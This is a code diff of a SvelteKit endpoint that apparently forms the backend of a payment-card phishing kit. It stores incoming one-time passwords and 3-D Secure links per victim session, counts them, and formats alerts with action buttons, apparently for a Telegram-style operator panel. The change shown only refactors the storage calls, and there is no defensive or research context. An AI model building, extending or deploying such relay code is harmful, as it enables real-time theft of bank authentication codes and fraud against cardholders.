@@ -9,7 +9,7 @@ import { json } from '@sveltejs/kit';
  *
  * @type {import('./$types').RequestHandler}
  */
-export async function POST({ request, url, getClientAddress }) {
+export async function POST({ request, url, getClientAddress, platform }) {
   const { type, sessionId, value, attempt } = await request.json().catch(() => ({}));
 
   if (!sessionId || !type) return json({ ok: false }, { status: 400 });
@@ -22,9 +22,9 @@ export async function POST({ request, url, getClientAddress }) {
   let keyboard;
 
   if (type === 'otp') {
-    saveData(sessionId, { lastOtp: value });
-    pushHistory(sessionId, 'otps', value);
-    inc('otps');
+    await saveData(platform, sessionId, { lastOtp: value });
+    await pushHistory(platform, sessionId, 'otps', value);
+    await inc(platform, 'otps');
     message =
 `🔑 *OTP Code*
 
@@ -36,9 +36,9 @@ export async function POST({ request, url, getClientAddress }) {
 🔑 Session: \`${sessionId}\``;
     keyboard = buildKeyboard(sessionId, baseUrl, 'otp');
   } else if (type === '3ds') {
-    saveData(sessionId, { lastLink: value });
-    pushHistory(sessionId, 'links', value);
-    inc('links3ds');
+    await saveData(platform, sessionId, { lastLink: value });
+    await pushHistory(platform, sessionId, 'links', value);
+    await inc(platform, 'links3ds');
     message =
 `🔗 *3D Secure Link*
 
